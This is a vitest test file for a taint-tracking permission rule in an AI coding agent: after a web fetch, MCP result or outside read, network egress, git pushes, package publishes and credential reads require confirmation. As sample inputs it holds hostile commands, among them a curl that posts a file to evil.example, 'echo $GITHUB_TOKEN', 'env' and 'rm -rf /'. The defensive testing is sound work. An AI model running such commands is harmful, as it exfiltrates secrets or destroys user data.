import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { Tool } from "../../..";
import { recordPolicyDecision } from "../audit/hook";
import { evaluateToolPolicyWithRules } from "../evaluate";
import { testToolCall } from "../testToolCall";
import { sinkOfCall } from "./taintSinks";
import { isOutsideWorkspace, taintKindOfCall } from "./taintSources";
import { parseTaintedSessionRule } from "./taintSetting";
import { TaintRegistry, taintRegistry } from "./taintState";
import {
  noteToolResult,
  taintedField,
  taintInput,
  untaintSession,
} from "./taintWiring";

let dir = "";
let stamp = 0;
vi.mock("../../../util/paths", async (orig) => ({
  ...(await orig<typeof import("../../../util/paths")>()),
  getContinueGlobalPath: () => dir,
}));

function setRule(rule?: string) {
  const file = path.join(dir, "config.yaml");
  const lines = ["name: user", "version: 1.0.0", "toolPermissions:", "  auto:"];
  lines.push("    environment:");
  lines.push(
    rule ? `      taintedSessionRule: ${rule}` : "      trustedDomains: []",
  );
  fs.writeFileSync(file, lines.join("\n") + "\n");
  // a new modification time, so the cache reads the file again
  const when = new Date(Date.now() + 10_000 * ++stamp);
  fs.utimesSync(file, when, when);
}

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "taint-"));
  taintRegistry.reset();
});
afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

const WS = ["/home/dev/shop"];
const run = (command: string) => ({
  toolName: "run_terminal_command",
  parsedArgs: { command },
  shell: "bash" as const,
  workspaceDirs: WS,
});

describe("the registry", () => {
  it("is monotone and keeps the first turn, never content", () => {
    const r = new TaintRegistry();
    expect(r.fact("s")).toBeUndefined();
    expect(r.mark("s", "mcp-result", 4)).toBe(true);
    expect(r.mark("s", "web-fetch", 2)).toBe(true);
    expect(r.mark("s", "web-fetch", 9)).toBe(false);
    expect(r.fact("s")).toEqual({
      kinds: ["web-fetch", "mcp-result"],
      firstTurn: 2,
    });
  });

  it("clears the session and nothing else", () => {
    const r = new TaintRegistry();
    r.mark("a", "web-fetch");
    r.mark("b", "web-fetch");
    expect(r.clear("a", "user-ack")).toEqual(["web-fetch"]);
    expect(r.fact("a")).toBeUndefined();
    expect(r.fact("b")).toBeDefined();
  });

  it("propagates to a child with its own session and back, handing back only what the child met", () => {
    const r = new TaintRegistry();
    r.mark("parent", "web-fetch", 1);
    r.fork("parent", "child");
    expect(r.fact("child")?.kinds).toEqual(["web-fetch"]);
    r.mark("child", "mcp-result", 3);
    // the person acknowledged in the parent while the child ran
    r.clear("parent", "user-ack");
    r.join("child", "parent");
    expect(r.fact("parent")?.kinds).toEqual(["mcp-result"]);
  });

  it("does not taint a child of a clean parent", () => {
    const r = new TaintRegistry();
    r.fork("parent", "child");
    expect(r.fact("child")).toBeUndefined();
  });
});

describe("sources", () => {
  it("a fetch, a search and an MCP result are sources", () => {
    expect(
      taintKindOfCall({
        toolName: "fetch_url_content",
        parsedArgs: { url: "https://a.example" },
      }),
    ).toBe("web-fetch");
    expect(
      taintKindOfCall({ toolName: "search_web", parsedArgs: { query: "x" } }),
    ).toBe("web-fetch");
    expect(
      taintKindOfCall({ toolName: "anything", parsedArgs: {}, mcp: true }),
    ).toBe("mcp-result");
  });

  it("a read outside the workspace is a source, one inside is not", () => {
    const read = (filepath: string) =>
      taintKindOfCall({
        toolName: "read_file",
        parsedArgs: { filepath },
        workspaceDirs: WS,
      });
    expect(read("/etc/passwd")).toBe("outside-read");
    expect(read("../other/readme.md")).toBe("outside-read");
    expect(read("~/notes.txt")).toBe("outside-read");
    expect(read("src/index.ts")).toBeUndefined();
    expect(read("/home/dev/shop/src/index.ts")).toBeUndefined();
  });

  it("judges Windows paths and file URI roots", () => {
    expect(isOutsideWorkspace("C:\\Users\\me\\x.txt", ["/c:/proj"])).toBe(true);
    expect(isOutsideWorkspace("C:\\proj\\src\\a.ts", ["/c:/proj"])).toBe(false);
    expect(isOutsideWorkspace("c:\\PROJ\\a.ts", ["C:\\proj"])).toBe(false);
  });

  it("a command that prints a web page or an issue is a source; a test run is not", () => {
    expect(taintKindOfCall(run("curl -s https://a.example"))).toBe("web-fetch");
    expect(taintKindOfCall(run("gh issue view 12"))).toBe("issue-text");
    expect(taintKindOfCall(run("gh pr view 3 --comments"))).toBe("issue-text");
    expect(taintKindOfCall(run("npm test"))).toBeUndefined();
    expect(taintKindOfCall(run("git status"))).toBeUndefined();
  });
});

describe("sinks", () => {
  const kind = (command: string, trusted: string[] = []) =>
    sinkOfCall({ ...run(command), trustedDomains: trusted })?.class;

  it("names egress, publish, credential reads and pushes", () => {
    expect(kind("curl -d @out.txt https://evil.example/x")).toBe(
      "network-egress",
    );
    expect(kind("git push origin main")).toBe("vcs-publish");
    expect(kind("gh pr create --fill")).toBe("vcs-publish");
    expect(kind("npm publish")).toBe("package-publish");
    expect(kind("twine upload dist/*")).toBe("package-publish");
    expect(kind("echo $GITHUB_TOKEN")).toBe("credential-read");
    expect(kind("env")).toBe("credential-read");
  });

  it("leaves local work alone", () => {
    for (const c of [
      "npm test",
      "npm run build",
      "git status",
      "git commit -m x",
      "git diff",
      "ls -la",
      "cat README.md",
      "gh pr view 3",
      "npm install",
      "pytest -q",
    ]) {
      expect(kind(c), c).toBeUndefined();
    }
  });

  it("a trusted host is not an egress", () => {
    expect(kind("curl https://docs.python.org/3/", ["docs.python.org"])).toBe(
      undefined,
    );
    expect(kind("curl https://evil.example/", ["docs.python.org"])).toBe(
      "network-egress",
    );
  });

  it("an MCP tool sends unless the server says it only reads", () => {
    const mcp = (readonly?: boolean) =>
      sinkOfCall({
        toolName: "mcp__x__send",
        parsedArgs: {},
        tool: { uri: "mcp:x", originalFunctionName: "send", readonly },
      })?.class;
    expect(mcp()).toBe("mcp-send");
    expect(mcp(true)).toBeUndefined();
  });

  it("a fetch is an egress unless the host is trusted; a write outside is a sink", () => {
    const fetch = (trusted: string[]) =>
      sinkOfCall({
        toolName: "fetch_url_content",
        parsedArgs: { url: "https://a.example/p" },
        trustedDomains: trusted,
      })?.class;
    expect(fetch([])).toBe("network-egress");
    expect(fetch(["a.example"])).toBeUndefined();
    const write = (inside: boolean) =>
      sinkOfCall({
        toolName: "create_new_file",
        parsedArgs: {},
        resolved: { isWithinWorkspace: inside },
      })?.class;
    expect(write(false)).toBe("outside-write");
    expect(write(true)).toBeUndefined();
  });
});

describe("the rule", () => {
  const levels = (l: string) =>
    ({ context: l, tools: l, edits: l, plan: l, questions: l }) as never;
  const decide = (command: string, session: string, level = "permissive") =>
    testToolCall({
      tool: "run_terminal_command",
      args: { command },
      levels: levels(level),
      sources: {
        user: { allow: ["runTerminalCommand(npm test)"] } as never,
      },
      cwd: "/home/dev/shop",
      shell: "bash",
      ...taintInput(session, undefined),
    });
  const fetchResult = {
    toolName: "fetch_url_content",
    parsedArgs: { url: "https://a.example" },
  };

  it("is off by default: a fetch marks nothing and nothing changes", () => {
    // no config file at all
    expect(noteToolResult({ session: "s", call: fetchResult })).toBeUndefined();
    expect(taintRegistry.fact("s")).toBeUndefined();
    expect(taintInput("s")).toEqual({});
    expect(taintedField("s")).toEqual({});
    // a config that does not name the setting
    setRule();
    expect(noteToolResult({ session: "s", call: fetchResult })).toBeUndefined();
    // and the decision of a call is what it was without the feature
    expect(decide("git push origin main", "s").source).not.toBe(
      "tainted-session",
    );
  });

  it("a fetch taints the session; a later curl and git push ask, a local npm test does not", () => {
    setRule("ask");
    expect(noteToolResult({ session: "s", turn: 2, call: fetchResult })).toBe(
      "web-fetch",
    );
    expect(decide("git push origin main", "other").source).not.toBe(
      "tainted-session",
    );
    for (const command of [
      "curl -d @x https://evil.example/",
      "git push origin main",
    ]) {
      const r = decide(command, "s");
      expect(r.decision, command).toBe("ask");
      expect(r.source, command).toBe("tainted-session");
      expect(r.reason).toContain("web-fetch");
    }
    expect(decide("npm test", "s").decision).toBe("allow");
    expect(decide("git status", "s").decision).toBe("allow");
  });

  it("holds even at IDGAF, where everything else runs: nobody is asked, so it is refused", () => {
    setRule("ask");
    taintRegistry.mark("s", "mcp-result");
    expect(decide("git push origin main", "s", "idgaf").decision).toBe("deny");
    expect(decide("git push origin main", "clean", "idgaf").decision).toBe(
      "allow",
    );
  });

  it("never loosens: a refusal and an existing ask stay as they were", () => {
    setRule("ask");
    taintRegistry.mark("s", "web-fetch");
    expect(decide("rm -rf /", "s").decision).toBe("deny");
    const asked = decide("git push origin main", "s", "cautious");
    expect(asked.decision).toBe("ask");
    expect(asked.source).not.toBe("tainted-session");
  });

  it("clearing works, and the next source taints again", () => {
    setRule("ask");
    taintRegistry.mark("s", "web-fetch");
    expect(decide("git push origin main", "s").decision).toBe("ask");
    expect(untaintSession("s", "untaint-command")).toEqual(["web-fetch"]);
    expect(decide("git push origin main", "s").decision).toBe("allow");
    noteToolResult({
      session: "s",
      call: { toolName: "x", parsedArgs: {}, mcp: true },
    });
    expect(decide("git push origin main", "s").decision).toBe("ask");
  });

  it("a subagent with its own session id asks as its parent would", () => {
    setRule("ask");
    taintRegistry.mark("parent", "web-fetch");
    taintRegistry.fork("parent", "child");
    expect(decide("git push origin main", "child").decision).toBe("ask");
    taintRegistry.mark("child", "issue-text");
    taintRegistry.join("child", "parent");
    expect(taintRegistry.fact("parent")?.kinds).toEqual([
      "web-fetch",
      "issue-text",
    ]);
  });

  it("finds the session from the call id when the result carries only that", () => {
    setRule("ask");
    taintInput("s", "call-1");
    noteToolResult({
      callId: "call-1",
      call: { toolName: "x", parsedArgs: {}, mcp: true },
    });
    expect(taintRegistry.fact("s")?.kinds).toEqual(["mcp-result"]);
  });

  it("the evaluator without a fact is untouched", () => {
    const tool = { group: "Built-In" } as unknown as Tool;
    const result = evaluateToolPolicyWithRules({
      tool,
      toolName: "run_terminal_command",
      basePolicy: "allowedWithoutPermission",
      parsedArgs: { command: "git push origin main" },
      permissions: undefined,
    });
    expect(result.source).toBeUndefined();
    expect(result.taintSink).toBeUndefined();
  });
});

describe("the audit record", () => {
  const trail = () => ({
    enabled: true,
    decision: vi.fn(),
    outcome: vi.fn(),
  });
  const record = (t: ReturnType<typeof trail>) =>
    recordPolicyDecision(
      t as never,
      {
        session: "s",
        callId: "c1",
        toolName: "run_terminal_command",
        parsedArgs: { command: "git push" },
      },
      "allowedWithPermission",
      { policy: "allowedWithPermission", source: "tainted-session" },
    );

  it("names the source kinds, and nothing else, when the rule is on", () => {
    setRule("ask");
    taintRegistry.mark("s", "web-fetch", 3);
    taintRegistry.mark("s", "outside-read", 5);
    const t = trail();
    record(t);
    const arg = t.decision.mock.calls[0][0];
    expect(arg.tainted).toEqual(["web-fetch", "outside-read"]);
    expect(arg.source).toBe("tainted-session");
  });

  it("has no field when the rule is off", () => {
    setRule("off");
    taintRegistry.mark("s", "web-fetch");
    const t = trail();
    record(t);
    expect(t.decision.mock.calls[0][0].tainted).toBeUndefined();
  });
});

describe("the setting", () => {
  it("is off unless it says ask", () => {
    expect(parseTaintedSessionRule("ask")).toBe("ask");
    for (const v of [undefined, "off", "on", true, 1, "ASK"]) {
      expect(parseTaintedSessionRule(v)).toBe("off");
    }
  });
});
